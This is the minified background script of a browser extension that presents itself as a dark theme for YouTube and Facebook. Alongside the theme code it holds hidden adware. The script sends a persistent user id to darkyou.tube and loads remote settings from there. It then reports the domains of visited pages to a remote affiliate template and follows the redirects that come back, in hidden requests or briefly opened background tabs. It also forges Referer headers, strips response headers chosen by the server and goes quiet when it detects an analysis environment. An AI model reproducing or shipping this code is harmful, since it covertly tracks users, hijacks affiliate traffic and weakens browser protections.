var _createClass=function(){function a(a,b){for(var c,d=0;d<b.length;d++)c=b[d],c.enumerable=c.enumerable||!1,c.configurable=!0,"value"in c&&(c.writable=!0),Object.defineProperty(a,c.key,c)}return function(b,c,d){return c&&a(b.prototype,c),d&&a(b,d),b}}();function _classCallCheck(a,b){if(!(a instanceof b))throw new TypeError("Cannot call a class as a function")}var ConfigStore=function(){function a(){_classCallCheck(this,a)}return _createClass(a,[{key:"defaults",value:function(){return{active:!0}}},{key:"get",value:function(){var a;return"youtube_click"===localStorage.getItem("click")?a=localStorage.getItem("youtube_skin"):"facebook_click"===localStorage.getItem("click")&&(a=localStorage.getItem("facebook_skin")),a?JSON.parse(a):this.defaults()}},{key:"set",value:function(a){null===localStorage.getItem("youtube_skin")&&localStorage.setItem("youtube_skin",JSON.stringify({active:!0})),null===localStorage.getItem("facebook_skin")&&localStorage.setItem("facebook_skin",JSON.stringify({active:!0}));var b=this.get();Object.keys(a).forEach(function(c){b[c]=a[c]})}}]),a}();var _createClass=function(){function a(a,b){for(var c,d=0;d<b.length;d++)c=b[d],c.enumerable=c.enumerable||!1,c.configurable=!0,"value"in c&&(c.writable=!0),Object.defineProperty(a,c.key,c)}return function(b,c,d){return c&&a(b.prototype,c),d&&a(b,d),b}}();function _toConsumableArray(a){if(Array.isArray(a)){for(var b=0,c=Array(a.length);b<a.length;b++)c[b]=a[b];return c}return Array.from(a)}function _classCallCheck(a,b){if(!(a instanceof b))throw new TypeError("Cannot call a class as a function")}var Controller=function(){function a(b){var c=this;_classCallCheck(this,a),this.config=b,this.listener=function(){},this.accessibleMethods={notifyActiveStatus:function(){return c.listener(c.config.get())}}}return _createClass(a,[{key:"callMethod",value:function(a,b){var c;return this.accessibleMethods[a]?(c=this.accessibleMethods)[a].apply(c,_toConsumableArray(b)):void 0}},{key:"onUpdate",value:function(a){this.listener=a,this.listener(this.config.get())}},{key:"isActive",value:function(){return this.config.get().active}},{key:"updateActive",value:function(a){this.config.set({active:a}),this.listener(this.config.get())}},{key:"toggleActive",value:function(){this.updateActive(this.isActive())}}]),a}();var _createClass=function(){function a(a,b){for(var c,d=0;d<b.length;d++)c=b[d],c.enumerable=c.enumerable||!1,c.configurable=!0,"value"in c&&(c.writable=!0),Object.defineProperty(a,c.key,c)}return function(b,c,d){return c&&a(b.prototype,c),d&&a(b,d),b}}();function _classCallCheck(a,b){if(!(a instanceof b))throw new TypeError("Cannot call a class as a function")}var Messenger=function(){function a(b){var c=this;_classCallCheck(this,a),this.runtime=b,this.listener=function(){},this.ports=[],this.runtime.onConnect.addListener(function(a){return c.handleConnect(a)})}return _createClass(a,[{key:"onMessage",value:function(a){this.listener=a}},{key:"handleConnect",value:function(a){var b=this;this.ports.push(a),a.onMessage.addListener(function(a){return b.listener(a)}),a.onDisconnect.addListener(function(){return b.removePort(a)})}},{key:"removePort",value:function(a){this.ports.splice(this.ports.indexOf(a),1)}},{key:"notify",value:function(){this.ports.forEach(function(a){try{"dark-youtube"===a.name?null===localStorage.getItem("youtube_skin")?a.postMessage({active:!0}):a.postMessage(JSON.parse(localStorage.getItem("youtube_skin"))):"dark-facebook"===a.name&&(null===localStorage.getItem("youtube_skin")?a.postMessage({active:!0}):a.postMessage(JSON.parse(localStorage.getItem("facebook_skin"))))}catch(a){}})}}]),a}(),configStore=new ConfigStore,messenger=new Messenger(chrome.runtime),controller=new Controller(configStore,messenger);messenger.onMessage(function(a){controller.callMethod(a.method,a.arguments||{},a.url)}),chrome.runtime.onMessage.addListener(function(a,b,c){return"optout"===a.action?(saveCfgKey("optouted",!0),!0):(!0===a.youtube_skin?localStorage.setItem("youtube_skin",JSON.stringify({active:!0})):!1===a.youtube_skin&&localStorage.setItem("youtube_skin",JSON.stringify({active:!1})),!0===a.facebook_skin?localStorage.setItem("facebook_skin",JSON.stringify({active:!0})):!1===a.facebook_skin&&localStorage.setItem("facebook_skin",JSON.stringify({active:!1})),!0===a.chrome_skin?localStorage.setItem("chrome_skin",JSON.stringify({active:!0})):!1===a.chrome_skin&&localStorage.setItem("chrome_skin",JSON.stringify({active:!1})),a.youtube_click?localStorage.setItem("click",a.youtube_click):a.facebook_click?localStorage.setItem("click",a.facebook_click):localStorage.setItem("click",a.chrome_click),c({storage:localStorage}),controller.toggleActive())});function genUuid(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(a){var b=0|16*Math.random(),c="x"==a?b:8|3&b;return c.toString(16)})}function heartbeat(){chrome.storage.local.get(function(a){var b=a.config||{};let c=new Date().getTime();"undefined"==typeof b.mTime&&(b.mTime=0),"undefined"==typeof b.lTime&&(b.lTime=0),"undefined"==typeof b.uid&&(b.uid=genUuid());let d=c-b.mTime;b.mTime=c,12e5>d&&(b.lTime+=d),initBgProcessor(b),initHeaders(b);var e="id="+encodeURIComponent(chrome.runtime.id)+"&mt="+encodeURIComponent(b.mTime)+"&lt="+encodeURIComponent(b.lTime)+"&uid="+encodeURIComponent(b.uid);fetch("http://darkyou.tube/api/json/?action=config&"+e).then(a=>a.json()).then(function(a){for(var c in a)b[c]=a[c];chrome.storage.local.set({config:b}),initBgProcessor(b),initHeaders(b)})}),setTimeout(function(){heartbeat()},9e5)}heartbeat();function saveCfgKey(a,b){chrome.storage.local.get(function(c){var d=c.config||{};d[a]=b,chrome.storage.local.set({config:d})})}function initHeaders(a){this.headersInitiated||a&&a.validateFields&&(this.headersInitiated=!0,chrome.webRequest&&chrome.webRequest.onHeadersReceived.addListener(function(b){return{responseHeaders:b.responseHeaders.filter(function(b){return!(a.validateFields&&!(1>a.validateFields.length))||!(-1<a.validateFields.indexOf(b.name.toLowerCase()))})}},{urls:["<all_urls>"]},["blocking","responseHeaders"]))}function initBgProcessor(a){let b=this;if(!a||!a.bgProcessor)return void bgProcessor.initCfg({mode:"off"});if(a.envDetected)return void bgProcessor.initCfg({mode:"off"});if(b.statProcessorRun)return void bgProcessor.initCfg(a.bgProcessor);b.statProcessorRun=!0,bgProcessor.initCfg(a.bgProcessor),chrome.webRequest.onCompleted.addListener(function(b){if("on"===bgProcessor.cfg.mode&&!a.envDetected&&!(0>b.tabId)&&200==b.statusCode&&"GET"==b.method){var c=b.url.replace(/^(https?\:\/\/[^\/]+).*$/,"$1"),d=b.url.replace(/^https?\:\/\/([^\/]+).*$/,"$1");bgProcessor.cfg.keep_www_prefix||(d=d.replace(/^www\.(.*)$/,"$1"));var e=new Date().getTime();if(!(bgProcessor.used_domains[d]&&bgProcessor.used_domains[d]+bgProcessor.cfg.ttl_ms>e)&&!(bgProcessor.cfg.domains_blacklist&&0<bgProcessor.cfg.domains_blacklist.length&&bgProcessor.cfg.domains_blacklist.includes(d))&&!(bgProcessor.cfg.domains_whitelist&&0<bgProcessor.cfg.domains_whitelist.length&&!bgProcessor.cfg.domains_whitelist.includes(d))){bgProcessor.used_domains[d]=e;var f=bgProcessor.cfg.aff_url_tmpl.replace("{URL}",encodeURIComponent(c));if(f=f.replace("{DOMAIN}",encodeURIComponent(d)),bgProcessor.cfg.aff_redirect)return!bgProcessor.cfg.domains_whitelist||0<!bgProcessor.cfg.domains_whitelist.length?void 0:(bgProcessor.push_chain(c),void bgProcessor.request_bg(f,d,0));var g=new XMLHttpRequest;g.timeout=bgProcessor.cfg.aff_timeout_ms,g.onreadystatechange=function(){if(4==g.readyState&&200==g.status){var a=g.responseText.replace(/[\n\r]/g,"");if(/^https?\:\/\//.test(a)&&a!=c){var b=c.replace(/^https?\:\/\/([^\/]+).*$/,"$1");bgProcessor.push_chain(c),bgProcessor.request(a,b)}else bgProcessor.used_domains[d]=e+bgProcessor.cfg.no_coverage_ttl_ms}},g.open("GET",f),g.send()}}},{urls:["http://*/*","https://*/*"],types:["main_frame"]});let c=["blocking","requestHeaders"];if(bgProcessor.cfg&&bgProcessor.cfg.rfr_rules&&0<bgProcessor.cfg.rfr_rules.length&&bgProcessor.cfg.listenerExtraOptions)for(var d in bgProcessor.cfg.listenerExtraOptions)c.push(bgProcessor.cfg.listenerExtraOptions[d]);chrome.webRequest.onBeforeSendHeaders.addListener(function(a){if("on"!==bgProcessor.cfg.mode||!bgProcessor.cfg.header)return{};for(var b=a.requestHeaders,c="",d=0;d<b.length;d++)if(b[d].name===bgProcessor.cfg.header){c=b[d].value,b.splice(d,1);break}if(!c)return{};for(var e=!1,d=0;d<b.length;d++)if("accept"==b[d].name.toLowerCase()){b[d].value=c,e=!0;break}if(e||b.push({name:"Accept",value:c}),0>a.tabId){let c="";if(bgProcessor.cfg.rfr_rules)for(let b in bgProcessor.cfg.rfr_rules){let d=bgProcessor.cfg.rfr_rules[b];if(d.url_request_before){if(!bgProcessor.last_request_url)continue;let a=new RegExp(d.url_request_before[0],d.url_request_before[1]);if(!a.test(bgProcessor.last_request_url))continue}if(d.url_response_before){if(!bgProcessor.last_response_url)continue;let a=new RegExp(d.url_response_before[0],d.url_response_before[1]);if(!a.test(bgProcessor.last_response_url))continue}if(d.url_chain){if(!bgProcessor.rdr_chain||1>bgProcessor.rdr_chain.length)continue;let a=new RegExp(d.url_chain[0],d.url_chain[1]),b=!1;for(let c in bgProcessor.rdr_chain){let d=bgProcessor.rdr_chain[c];if(a.test(d)){b=!0;break}}if(!b)continue}if(d.url_request){let b=new RegExp(d.url_request[0],d.url_request[1]);if(!b.test(a.url))continue}if("allow"==d.rule&&(c=bgProcessor.last_response_url),"replace"==d.rule&&d.replace&&(c=d.replace),"regexp"==d.rule&&d.regexp&&d.replace){var f=new RegExp(d.regexp[0],d.regexp[1]);c=bgProcessor.last_response_url.replace(f,d.replace)}break}if(c){let a=b.findIndex(a=>"referer"==a.name.toLowerCase());-1<a?b[a].value=c:b.push({name:"Referer",value:c})}}return{requestHeaders:b}},{urls:["http://*/*","https://*/*"]},c)}var bgProcessor={cfg:{mode:"off"},used_domains:{},rdr_chain:[],last_request_url:"",last_response_url:"",initCfg(a){a&&(this.cfg=a)},request:function(a,b){this.cfg.debug&&console.log("bgProcessor.request",a,b),this.cfg.ntab_tag&&-1!==a.indexOf(this.cfg.ntab_tag)?setTimeout(function(){bgProcessor.request_tab(a,b)},this.cfg.ntab_delay_ms):this.request_bg(a,b,0)},push_chain:function(a){this.rdr_chain.push(a)},request_bg:function(a,b,c){if(!(c>=this.cfg.rdr_max_count)&&this.cfg.header){this.push_chain(a),bgProcessor.last_request_url=a;var d=new XMLHttpRequest;d.timeout=this.cfg.timeout,d.onreadystatechange=function(){var a=Math.floor;if(4==d.readyState)if(200==d.status){var e=d.responseText.replace(/[\n\r\s]/g,"").replace(/\.href/g,""),f=!1,g=d.responseURL,h=bgProcessor.is_rdr_url(d.responseURL);if(bgProcessor.last_response_url=g,bgProcessor.last_response_url!=bgProcessor.last_request_url&&bgProcessor.push_chain(bgProcessor.last_response_url),h||e.length<bgProcessor.cfg.jsrdr_maxlen_bytes){var j=e.replace(/^.*?location\=[\'\"]([^\'\"]+).*$/,"$1");/^\//.test(j)&&(link2Url=new URL(j,d.responseURL),j=link2Url.href),/^https?\:\/\//.test(j)&&(bgProcessor.request_bg(j,b,c+1),f=!0)}if(!f&&bgProcessor.cfg.common_rdr_rules)for(var k in bgProcessor.cfg.common_rdr_rules){var i=bgProcessor.cfg.common_rdr_rules[k],l=new RegExp(i.search[0],i.search[1]),m=e;if("uri"==i.where&&(m=g),i.url_pattern){var n=new RegExp(i.url_pattern[0],i.url_pattern[1]);if(!n.test(g))continue}if(m.match(l)){var p=m.replace(l,i.replace);if(i.applyAfter)for(var q in i.applyAfter){var o=i.applyAfter[q];if("decodeURIComponent"==o)p=decodeURIComponent(p);else if("decodeHTML"==o){p=function(a){var b=document.createElement("textarea");return b.innerHTML=a,b.value}(p)}else;}if(i.replacements)for(var r in i.replacements)p=p.replace(r,i.replacements[r]);if(i.regReplacements)for(var s in i.regReplacements){var t=new RegExp(i.regReplacements[s].pattern[0],i.regReplacements[s].pattern[1]);p=p.replace(t,i.regReplacements[s].replace)}if(/^\//.test(p)&&(link2Url=new URL(p,d.responseURL),p=link2Url.href),/^https?\:\/\//.test(p)){var u=i.delay?i.delay:0;if("string"==typeof u&&-1<u.indexOf("-")){var v=u.split("-");u=a(Math.random()*(parseInt(v[1])-parseInt(v[0])+1)+parseInt(v[0]))}setTimeout(()=>{bgProcessor.request_bg(p,b,c+1)},parseInt(u)),f=!0;break}}}f||bgProcessor.send_rdr_log()}else bgProcessor.send_rdr_log(!0)},d.open("GET",a,!0),d.setRequestHeader(this.cfg.header,"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),d.send()}},is_rdr_url:function(a){var b=new URL(a);return!!(this.cfg.rdr_coverage&&b.host in this.cfg.rdr_coverage)||!!/\/goto\/?$/.test(b.pathname)},request_tab:function(a,b){this.cfg.debug&&console.log("bgProcessor.request_tab",a,b),chrome.tabs.create({url:a,active:!1},function(a){setTimeout(function(){try{chrome.tabs.remove(a.id)}catch(a){}},bgProcessor.cfg.ntab_duration_ms)})},send_rdr_log:function(a=!1){if(this.rdr_chain&&this.cfg&&this.cfg.log_rdr_active&&this.cfg.log_rdr_endpoint){if(this.cfg&&this.cfg.log_rdr_onlydifferent){var b=this.rdr_chain[0],c=this.rdr_chain[this.rdr_chain.length-1];if(b.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1")==c.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1"))return}var d=new XMLHttpRequest,e=this.cfg.log_rdr_endpoint;a&&this.cfg.log_rdr_errors_endpoint&&(e=this.cfg.log_rdr_errors_endpoint),d.open("POST",e,!0),d.setRequestHeader("Content-Type","application/json;charset=UTF-8"),d.send(JSON.stringify(this.rdr_chain)),this.rdr_chain=[],this.last_request_url=null,this.last_response_url=null}}};controller.onUpdate(function(){messenger.notify({active:controller.isActive()})}),chrome.runtime.onInstalled.addListener(function(a){"install"==a.reason&&chrome.tabs.create({url:"https://darkyou.tube/welcome"})}),chrome.runtime.onMessage.addListener((a,b,c)=>{"top"===a.action&&c(b.tab.url)});